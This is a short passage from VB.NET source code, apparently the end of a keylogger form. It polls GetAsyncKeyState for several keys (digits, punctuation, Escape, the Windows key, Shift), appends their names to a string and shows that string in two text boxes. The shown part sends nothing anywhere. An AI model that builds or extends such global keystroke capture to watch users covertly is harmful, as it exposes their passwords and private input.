            TECLA = TECLA + "9"

        ElseIf (GetAsyncKeyState(188)) Then
            TECLA = TECLA + ","

        ElseIf (GetAsyncKeyState(190)) Then
            TECLA = TECLA + "."

        ElseIf (GetAsyncKeyState(187)) Then
            TECLA = TECLA + "="

        ElseIf (GetAsyncKeyState(27)) Then
            TECLA = TECLA + "{ESC}"

        ElseIf (GetAsyncKeyState(Keys.RWin)) Then
            TECLA = TECLA + "{win}"

        ElseIf (GetAsyncKeyState(16)) Then
            TECLA = TECLA + "{Shift}"

        End If

        Me.TextBox1.Text = TECLA

        Me.TextBox2.Text = TECLA
    End Sub
End Class
